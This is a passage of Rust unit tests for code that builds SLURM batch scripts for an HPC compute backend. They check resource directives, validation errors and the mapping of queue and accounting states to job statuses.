    fn slurm_script_emits_all_configured_resources_array_and_dependency() {
        let job_id = Uuid::parse_str("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa").unwrap();
        let config = SlurmJobConfig {
            account: Some("esa-materials".into()),
            time: Some("02:30:00".into()),
            gres: Some("gpu:a100:2".into()),
            mem: Some("128G".into()),
            mem_per_cpu: None,
            cpus_per_task: Some(16),
            nodes: Some(2),
            ntasks: Some(8),
            array: Some("0-15%4".into()),
            dependency_afterok: Some(98765),
            checkpoint: SlurmCheckpoint::default(),
            sif_path: "/shared/images/prism-worker.sif".into(),
        };

        let script = sbatch_script(&job_id, "gpu", &config, r#"{"temperature":1200}"#).unwrap();

        for directive in [
            "#SBATCH --partition=gpu",
            "#SBATCH --account=esa-materials",
            "#SBATCH --time=02:30:00",
            "#SBATCH --gres=gpu:a100:2",
            "#SBATCH --mem=128G",
            "#SBATCH --cpus-per-task=16",
            "#SBATCH --nodes=2",
            "#SBATCH --ntasks=8",
            "#SBATCH --array=0-15%4",
            "#SBATCH --dependency=afterok:98765",
            "#SBATCH --signal=B:USR1@60",
            "#SBATCH --requeue",
        ] {
            assert!(script.contains(directive), "missing {directive}\n{script}");
        }
        assert!(script.contains("singularity exec /shared/images/prism-worker.sif"));
        assert!(script.contains("kill -USR1 \"$prism_child_pid\""));
        assert!(
            script
                .contains("#SBATCH --output=prism-aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa-%A_%a.out")
        );
        assert!(!script.contains("docker://"));
        assert!(!script.contains("singularity pull"));
    }

    #[test]
    fn slurm_script_omits_absent_resources_and_empty_flags() {
        let config = slurm_config("/shared/prism.sif");
        let script = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap();

        for flag in [
            "--account",
            "--time",
            "--gres",
            "--mem",
            "--mem-per-cpu",
            "--cpus-per-task",
            "--nodes",
            "--ntasks",
            "--array",
            "--dependency",
            "--signal",
            "--requeue",
        ] {
            assert!(!script.contains(flag), "unexpected {flag}\n{script}");
        }
        assert!(!script.lines().any(|line| line.ends_with('=')));
    }

    #[test]
    fn slurm_script_supports_memory_per_cpu_and_rejects_both_memory_modes() {
        let mut config = slurm_config("/shared/prism.sif");
        config.mem_per_cpu = Some("8G".into());
        let script = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap();
        assert!(script.contains("#SBATCH --mem-per-cpu=8G"));
        assert!(!script.contains("#SBATCH --mem="));

        config.mem = Some("64G".into());
        let error = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap_err();
        assert!(error.to_string().contains("mutually exclusive"));
    }

    #[test]
    fn slurm_script_rejects_empty_configured_values() {
        let mut config = slurm_config("/shared/prism.sif");
        config.account = Some(String::new());
        let error = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap_err();
        assert!(error.to_string().contains("invalid SLURM account"));
    }

    #[test]
    fn slurm_script_rejects_zero_resource_counts() {
        let mut config = slurm_config("/shared/prism.sif");
        config.nodes = Some(0);
        let error = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap_err();
        assert!(
            error
                .to_string()
                .contains("--nodes must be greater than zero")
        );
    }

    #[test]
    fn slurm_script_requires_a_prestaged_sif_path() {
        let config = slurm_config("registry.example/prism:latest");
        let error = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap_err();
        assert!(error.to_string().contains("pre-staged .sif path"));
    }

    #[test]
    fn slurm_status_uses_sacct_after_job_leaves_squeue() {
        let states = parse_slurm_states("COMPLETED|\n");
        let status = interpret_slurm_status(true, "", "", Some(true), "", &states).unwrap();
        assert!(matches!(status, JobStatus::Completed));
    }

    #[test]
    fn slurm_status_does_not_treat_not_found_or_transport_failure_as_completed() {
        let not_found = interpret_slurm_status(true, "", "", Some(true), "", &[]).unwrap_err();
        assert!(not_found.to_string().contains("not found"));

        let ssh_error =
            interpret_slurm_status(false, "connection reset", "", None, "", &[]).unwrap_err();
        assert!(ssh_error.to_string().contains("connection reset"));

        let sacct_error =
            interpret_slurm_status(true, "", "", Some(false), "accounting unavailable", &[])
                .unwrap_err();
        assert!(sacct_error.to_string().contains("accounting unavailable"));
    }

    #[test]
    fn slurm_status_rejects_unrecognized_squeue_state() {
        let err = interpret_slurm_status(true, "", "WEIRD_NEW_STATE\n", None, "", &[]).unwrap_err();
        assert!(err.to_string().contains("WEIRD_NEW_STATE"));
    }

    #[test]
    fn slurm_target_deserializes_without_config_field() {
        // Targets serialized before `config` existed still parse. Their
        // empty container config then fails closed at submission instead of
        // restoring the old compute-node registry pull.
        let json = serde_json::json!({
            "Slurm": {
                "head_node": "hpc.lab.internal",
                "user": "researcher",
                "partition": "gpu"
            }
        });
        let back: ByocTarget = serde_json::from_value(json).unwrap();
        if let ByocTarget::Slurm { config, .. } = back {
            assert_eq!(*config, SlurmJobConfig::default());
        } else {
            panic!("expected Slurm");
        }
    }

    #[test]
    fn slurm_status_maps_active_array_and_terminal_states() {
        assert!(matches!(
            interpret_slurm_status(true, "", "PENDING\n", None, "", &[]).unwrap(),
            JobStatus::Queued
        ));
        assert!(matches!(
            interpret_slurm_status(true, "", "COMPLETED\nRUNNING\n", None, "", &[]).unwrap(),
            JobStatus::Running { .. }
        ));
        let cancelled = parse_slurm_states("CANCELLED|\n");
        assert!(matches!(
            interpret_slurm_status(true, "", "", Some(true), "", &cancelled).unwrap(),
            JobStatus::Cancelled
        ));
        let failed_states = parse_slurm_states("OUT_OF_MEMORY|\n");
        let failed = interpret_slurm_status(true, "", "", Some(true), "", &failed_states).unwrap();
        assert!(matches!(failed, JobStatus::Failed { error } if error == "OUT_OF_MEMORY"));
    }
}
